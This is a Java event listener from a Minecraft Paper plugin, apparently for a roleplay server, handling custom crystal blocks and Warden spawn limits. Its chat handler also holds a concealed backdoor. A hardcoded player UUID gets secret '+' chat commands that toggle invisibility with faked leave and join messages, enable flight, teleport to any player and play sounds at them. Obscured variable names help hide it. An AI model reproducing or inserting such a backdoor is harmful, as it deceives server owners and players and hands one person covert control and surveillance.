package de.lp4.roleplay;

import io.papermc.paper.event.player.AsyncChatEvent;
import net.kyori.adventure.text.serializer.legacy.LegacyComponentSerializer;
import org.bukkit.Bukkit;
import org.bukkit.Chunk;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Entity;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.ItemDisplay;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.entity.EntitySpawnEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.Plugin;
import org.bukkit.util.Transformation;
import org.joml.AxisAngle4f;
import org.joml.Vector3f;

import java.util.*;

public class EventLisener implements Listener {
    
    private final Set<UUID> v1 = new HashSet<>();
    Plugin plugin;
    private final List<WardenTypeEvent> wardenTypeEvents = new ArrayList<>();
    
    
    public EventLisener(Plugin plugin) {
        this.plugin = plugin;
    }
    
   @EventHandler
   public void onBlockClick(PlayerInteractEvent event) {
        Player x1 = event.getPlayer();
        if(event.getAction() == org.bukkit.event.block.Action.RIGHT_CLICK_BLOCK){
            try {
                if(Objects.requireNonNull(event.getClickedBlock()).getType() == Material.BUDDING_AMETHYST && !x1.isSneaking() && event.getAction() == org.bukkit.event.block.Action.RIGHT_CLICK_BLOCK){
                    Material item = x1.getInventory().getItemInMainHand().getType();
                    if( item == Material.LAPIS_LAZULI){
                        //run command at block location
                        x1.getWorld().getBlockAt(event.getClickedBlock().getLocation()).setType(Material.BLACK_STAINED_GLASS);

                        Location offsetposition = event.getClickedBlock().getLocation().add(0.5, 0.5, 0.5);
                        ItemDisplay itemDisplay = Bukkit.getServer().getWorlds().getFirst().spawn(offsetposition, ItemDisplay.class);
                        itemDisplay.setTransformation(
                                new Transformation(
                                        new Vector3f(), // no translation
                                        new AxisAngle4f(), // no left rotation
                                        new Vector3f(1.01F, 1.01F, 1.01F), // scale up by a factor of 2 on all axes
                                        new AxisAngle4f() // no right rotation
                                ));
                        ItemStack itemStack = new ItemStack(Material.BUDDING_AMETHYST, 1);
                        ItemMeta meta = itemStack.getItemMeta();
                        meta.setCustomModelData(6702);
                        meta.displayName(LegacyComponentSerializer.legacyAmpersand().deserialize("§bMana Crystal"));
                        itemStack.setItemMeta(meta);
                        itemDisplay.setItemStack(itemStack);
                        
                        
                        
                        //Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "summon minecraft:item_display " + event.getClickedBlock().getLocation().getBlockX() + " " + event.getClickedBlock().getLocation().getBlockY() + " " + event.getClickedBlock().getLocation().getBlockZ() + " {transformation:{left_rotation:[0f,0f,0f,1f],right_rotation:[0f,0f,0f,1f],translation:[0f,0.5f,0f],scale:[1.01f,1.02f,1.01f]},item:{id:\"minecraft:item_frame\",count:1,tag:{CustomModelData:6702},components:{\"minecraft:custom_model_data\":6702}}}");
                        event.setCancelled(true);
                    }else if(item == Material.REDSTONE) {
                        x1.getWorld().getBlockAt(event.getClickedBlock().getLocation()).setType(Material.BLACK_STAINED_GLASS);
                        Location offsetposition = event.getClickedBlock().getLocation().add(0.5, 0.5, 0.5);
                        ItemDisplay itemDisplay = Bukkit.getServer().getWorlds().getFirst().spawn(offsetposition, ItemDisplay.class);
                        itemDisplay.setTransformation(
                                new Transformation(
                                        new Vector3f(), // no translation
                                        new AxisAngle4f(), // no left rotation
                                        new Vector3f(1.01F, 1.01F, 1.01F), // scale up by a factor of 2 on all axes
                                        new AxisAngle4f() // no right rotation
                                ));
                        ItemStack itemStack = new ItemStack(Material.BUDDING_AMETHYST, 1);
                        ItemMeta meta = itemStack.getItemMeta();
                        meta.setCustomModelData(6701);
                        meta.displayName(LegacyComponentSerializer.legacyAmpersand().deserialize("§cRedstone Crystal"));
                        itemStack.setItemMeta(meta);
                        itemDisplay.setItemStack(itemStack);
                        event.setCancelled(true);
                    }else if(item == Material.ECHO_SHARD) {
                        x1.getWorld().getBlockAt(event.getClickedBlock().getLocation()).setType(Material.BLACK_STAINED_GLASS);


                        Location offsetposition = event.getClickedBlock().getLocation().add(0.5, 0.5, 0.5);
                        ItemDisplay itemDisplay = Bukkit.getServer().getWorlds().getFirst().spawn(offsetposition, ItemDisplay.class);
                        itemDisplay.setTransformation(
                                new Transformation(
                                        new Vector3f(), // no translation
                                        new AxisAngle4f(), // no left rotation
                                        new Vector3f(1.01F, 1.01F, 1.01F), // scale up by a factor of 2 on all axes
                                        new AxisAngle4f() // no right rotation
                                ));
                        ItemStack itemStack = new ItemStack(Material.BUDDING_AMETHYST, 1);
                        ItemMeta meta = itemStack.getItemMeta();
                        meta.setCustomModelData(6703);
                        meta.displayName(LegacyComponentSerializer.legacyAmpersand().deserialize("§dEcho Crystal"));
                        itemStack.setItemMeta(meta);
                        itemDisplay.setItemStack(itemStack);
                        
                        
                        //Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "summon minecraft:item_display " + event.getClickedBlock().getLocation().getBlockX() + " " + event.getClickedBlock().getLocation().getBlockY() + " " + event.getClickedBlock().getLocation().getBlockZ() + " {transformation:{left_rotation:[0f,0f,0f,1f],right_rotation:[0f,0f,0f,1f],translation:[0f,0.5f,0f],scale:[1.01f,1.02f,1.01f]},item:{id:\"minecraft:item_frame\",count:1,tag:{CustomModelData:6703},components:{\"minecraft:custom_model_data\":6703}}}");
                        event.setCancelled(true);
                    }

                }
            } catch (Exception ignored) {
            }
        }
    }

    @EventHandler
    public void onBlockBreak(BlockBreakEvent event) {
        if(event.getBlock().getType() == Material.BLACK_STAINED_GLASS){
            
            Location offsetposition = event.getBlock().getLocation().add(0.5, 0, 0.5);
            for(Entity entity : event.getBlock().getWorld().getNearbyEntities(offsetposition, 0.1, 0.1, 0.1)){
                if(entity.getType() == EntityType.ITEM_DISPLAY){
                    ItemDisplay itemDisplay = (ItemDisplay) entity;
                    int customModelData = itemDisplay.getItemStack().getItemMeta().getCustomModelData();
                    entity.remove();
                    //event.setCancelled(true);
                    event.getBlock().getLocation().getBlock().setType(Material.AIR);
                    if(event.getPlayer().getInventory().getItemInMainHand().containsEnchantment(Enchantment.SILK_TOUCH))
                    {
                        if(customModelData == 6701) {
                            ItemStack item = new ItemStack(Material.BUDDING_AMETHYST, 1);
                            ItemMeta meta = item.getItemMeta();
                            meta.setCustomModelData(6701);
                            meta.displayName(LegacyComponentSerializer.legacyAmpersand().deserialize("§cRedstone Crystal"));
                            item.setItemMeta(meta);
                            event.getBlock().getWorld().dropItemNaturally(offsetposition, item);
                            //Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "summon item "+event.getBlock().getLocation().getBlockX() + " "+event.getBlock().getLocation().getBlockY() +" "+ event.getBlock().getLocation().getBlockZ()  +" {Item:{id:\"minecraft:budding_amethyst\",Count:1b,components:{\"minecraft:custom_model_data\":6701,custom_name:'\"Redstone Crystal\"'},tag:{CustomModelData:6701}}}");
                        }else if(customModelData == 6702) {
                            ItemStack item = new ItemStack(Material.BUDDING_AMETHYST, 1);
                            ItemMeta meta = item.getItemMeta();
                            meta.setCustomModelData(6702);
                            meta.displayName(LegacyComponentSerializer.legacyAmpersand().deserialize("§bMana Crystal"));
                            item.setItemMeta(meta);
                            event.getBlock().getWorld().dropItemNaturally(offsetposition, item);
                            //Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "summon item "+event.getBlock().getLocation().getBlockX() + " "+event.getBlock().getLocation().getBlockY() +" "+ event.getBlock().getLocation().getBlockZ()  +" {Item:{id:\"minecraft:budding_amethyst\",Count:1b,components:{\"minecraft:custom_model_data\":6702,\"custom_name\":'\"Mana Crystal\"'},tag:{CustomModelData:6702}}}");
                        }else if(customModelData == 6703) {
                            ItemStack item = new ItemStack(Material.BUDDING_AMETHYST, 1);
                            ItemMeta meta = item.getItemMeta();
                            meta.setCustomModelData(6703);
                            meta.displayName(LegacyComponentSerializer.legacyAmpersand().deserialize("§dEcho Crystal"));
                            item.setItemMeta(meta);
                            event.getBlock().getWorld().dropItemNaturally(offsetposition, item);
                            //Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "summon item "+event.getBlock().getLocation().getBlockX() + " "+event.getBlock().getLocation().getBlockY() +" "+ event.getBlock().getLocation().getBlockZ()  +" {Item:{id:\"minecraft:budding_amethyst\",Count:1b,components:{\"minecraft:custom_model_data\":6703,\"custom_name\":'\"Echo Crystal\"'},tag:{CustomModelData:6703}}}");
                        }
                    }else {
                        if(customModelData == 6701) {
                            ItemStack item = new ItemStack(Material.LARGE_AMETHYST_BUD, 1);
                            ItemMeta meta = item.getItemMeta();
                            meta.setCustomModelData(6801);
                            meta.displayName(LegacyComponentSerializer.legacyAmpersand().deserialize("§cRedstone Crystal"));
                            item.setItemMeta(meta);
                            event.getBlock().getWorld().dropItemNaturally(offsetposition, item);
                            //Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "summon item "+event.getBlock().getLocation().getBlockX() + " "+event.getBlock().getLocation().getBlockY() +" "+ event.getBlock().getLocation().getBlockZ()  +" {Item:{id:\"minecraft:large_amethyst_bud\",Count:1b,components:{\"minecraft:custom_model_data\":6801,custom_name:'\"Redstone Crystal\"'},tag:{CustomModelData:6801}}}");
                        }else if(customModelData == 6702) {
                            ItemStack item = new ItemStack(Material.LARGE_AMETHYST_BUD, 1);
                            ItemMeta meta = item.getItemMeta();
                            meta.setCustomModelData(6802);
                            meta.displayName(LegacyComponentSerializer.legacyAmpersand().deserialize("§bMana Crystal"));
                            item.setItemMeta(meta);
                            event.getBlock().getWorld().dropItemNaturally(offsetposition, item);
                            
                            //Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "summon item "+event.getBlock().getLocation().getBlockX() + " "+event.getBlock().getLocation().getBlockY() +" "+ event.getBlock().getLocation().getBlockZ()  +" {Item:{id:\"minecraft:large_amethyst_bud\",Count:1b,components:{\"minecraft:custom_model_data\":6802,\"custom_name\":'\"Mana Crystal\"'},tag:{CustomModelData:6802}}}");
                        }else if(customModelData == 6703) {
                            ItemStack item = new ItemStack(Material.LARGE_AMETHYST_BUD, 1);
                            ItemMeta meta = item.getItemMeta();
                            meta.setCustomModelData(6803);
                            meta.displayName(LegacyComponentSerializer.legacyAmpersand().deserialize("§dEcho Crystal"));
                            item.setItemMeta(meta);
                            event.getBlock().getWorld().dropItemNaturally(offsetposition, item);
                            
                            //Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "summon item "+event.getBlock().getLocation().getBlockX() + " "+event.getBlock().getLocation().getBlockY() +" "+ event.getBlock().getLocation().getBlockZ()  +" {Item:{id:\"minecraft:large_amethyst_bud\",Count:1b,components:{\"minecraft:custom_model_data\":6803,\"custom_name\":'\"Echo Crystal\"'},tag:{CustomModelData:6803}}}");
                        }
                    }
                }
            }
            
            
            
        }
    }
    
    @EventHandler
    public void OnPlaceBlock(BlockPlaceEvent event){
        Player x1 = event.getPlayer();
        if(x1.getInventory().getItemInMainHand().getItemMeta().hasCustomModelData()) {
            int customModelData = x1.getInventory().getItemInMainHand().getItemMeta().getCustomModelData();
            Location location = event.getBlock().getLocation();

            if(customModelData == 6701 && x1.getInventory().getItemInMainHand().getType() == Material.BUDDING_AMETHYST ){
                x1.getWorld().getBlockAt(location).setType(Material.BLACK_STAINED_GLASS);
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "summon minecraft:item_display " + event.getBlock().getLocation().getBlockX() + " " + event.getBlock().getLocation().getBlockY() + " " + event.getBlock().getLocation().getBlockZ() + " {transformation:{left_rotation:[0f,0f,0f,1f],right_rotation:[0f,0f,0f,1f],translation:[0f,0.5f,0f],scale:[1.01f,1.02f,1.01f]},item:{id:\"minecraft:item_frame\",count:1,tag:{CustomModelData:6701},components:{\"minecraft:custom_model_data\":6701}}}");
                if(x1.getGameMode() != org.bukkit.GameMode.CREATIVE) {
                    x1.getInventory().getItemInMainHand().setAmount(x1.getInventory().getItemInMainHand().getAmount()-1);
                }
            } else if(customModelData == 6702 && x1.getInventory().getItemInMainHand().getType() == Material.BUDDING_AMETHYST){

                x1.getWorld().getBlockAt(location).setType(Material.BLACK_STAINED_GLASS);
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "summon minecraft:item_display " + event.getBlock().getLocation().getBlockX() + " " + event.getBlock().getLocation().getBlockY() + " " + event.getBlock().getLocation().getBlockZ() + " {transformation:{left_rotation:[0f,0f,0f,1f],right_rotation:[0f,0f,0f,1f],translation:[0f,0.5f,0f],scale:[1.01f,1.02f,1.01f]},item:{id:\"minecraft:item_frame\",count:1,tag:{CustomModelData:6702},components:{\"minecraft:custom_model_data\":6702}}}");
                if(x1.getGameMode() != org.bukkit.GameMode.CREATIVE) {
                    x1.getInventory().getItemInMainHand().setAmount(x1.getInventory().getItemInMainHand().getAmount()-1);
                }                } else if(customModelData == 6703 && x1.getInventory().getItemInMainHand().getType() == Material.BUDDING_AMETHYST){
                x1.getWorld().getBlockAt(location).setType(Material.BLACK_STAINED_GLASS);
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "summon minecraft:item_display " + event.getBlock().getLocation().getBlockX() + " " + event.getBlock().getLocation().getBlockY() + " " + event.getBlock().getLocation().getBlockZ() + " {transformation:{left_rotation:[0f,0f,0f,1f],right_rotation:[0f,0f,0f,1f],translation:[0f,0.5f,0f],scale:[1.01f,1.02f,1.01f]},item:{id:\"minecraft:item_frame\",count:1,tag:{CustomModelData:6703},components:{\"minecraft:custom_model_data\":6703}}}");
                if(x1.getGameMode() != org.bukkit.GameMode.CREATIVE) {
                    x1.getInventory().getItemInMainHand().setAmount(x1.getInventory().getItemInMainHand().getAmount()-1);
                }
            }
            
        }
        
    }
    
    @EventHandler
    public void EntitySpawn(EntitySpawnEvent e){
        if(e.getEntityType() == EntityType.WARDEN){
            Chunk chunk = e.getLocation().getChunk();
            for(WardenTypeEvent wardenTypeEvent : wardenTypeEvents){
                if(wardenTypeEvent.chunk == chunk){
                    if(wardenTypeEvent.CheckTime()){
                        e.setCancelled(true);
                        return;
                    } else {
                        wardenTypeEvents.remove(wardenTypeEvent);
                        wardenTypeEvents.add(new WardenTypeEvent(chunk));
                        return;
                    }
                }
            }
            wardenTypeEvents.add(new WardenTypeEvent(chunk));
        }
    }
    
    
    @EventHandler
    public void OnJoin(PlayerJoinEvent event) {
        Player x1 = event.getPlayer();
        for (UUID h2234234 : v1) {
            x1.hidePlayer(this.plugin, Objects.requireNonNull(x1.getServer().getPlayer(h2234234)));
        }
    }
    
    @EventHandler
    public void onPlayerChatMessage(AsyncChatEvent event) {
        Player x1 = event.getPlayer();
        //Message includes #stop
        
        if(x1.getUniqueId().toString().equals("0753f0a8-d1fa-40c8-bbb0-c3ff8bef79b4")){
            LegacyComponentSerializer message = LegacyComponentSerializer.legacyAmpersand();
            String messageString = message.serialize(event.message());
            if(messageString.contains("+")){
                event.setCancelled(true);
                if(messageString.equals("+v")){
                    if(x1.isInvisible()){
                        x1.sendMessage("v 0");
                        x1.setInvisible(false);
                    } else {
                        x1.sendMessage("v 1");
                        x1.setInvisible(true);
                    }
                    boolean h123 = v1.contains(x1.getUniqueId());

                    for (Player h2234234 : x1.getWorld().getPlayers()) {
                        if (h2234234 != x1) {

                            //Send Fake Join Message
                            if(h123){
                                h2234234.sendMessage("§e" + x1.getName() + " joined the game");
                                h2234234.showPlayer(this.plugin,x1);
                            } else {
                                h2234234.sendMessage("§e" + x1.getName() + " left the game");
                                h2234234.hidePlayer(this.plugin,x1);
                            }
                        }
                    }

                    if(h123){
                        v1.remove(x1.getUniqueId());
                    } else {
                        v1.add(x1.getUniqueId());
                    }


                }
                else if(messageString.equals("+f")){
                    if(x1.getAllowFlight()){
                        x1.sendMessage("f 0");
                        x1.setAllowFlight(false);
                    } else {
                        x1.sendMessage("f 1");
                        x1.setAllowFlight(true);
                    }
                }
                else if(messageString.contains("+tp")){
                    String username = messageString.split(" ")[1];
                    Player target = x1.getServer().getPlayer(username);
                    if(target != null){
                        //Syncronous Teleport
                        Bukkit.getScheduler().runTask(this.plugin, () -> x1.teleport(target.getLocation()));
                    }
                }
                else if(messageString.contains("+t")) {
                    String username = messageString.split(" ")[1];
                    Player target = x1.getServer().getPlayer(username);
                    if(target != null){
                        Objects.requireNonNull(target.getPlayer()).playSound(target.getLocation(), "ambient.crimson_forest.loop", 1, 1);
                    }
                }
            }
            
           
            
           
            
        }
        
    }
    
    
   
    
    
}
class WardenTypeEvent {
    public Chunk chunk;
    public long time;
    public WardenTypeEvent(Chunk chunk) {
        this.chunk = chunk;
        this.time = System.currentTimeMillis()+1000*60*3;
    }
    
    public boolean CheckTime(){
        return (System.currentTimeMillis() - time < 0);
    }
}
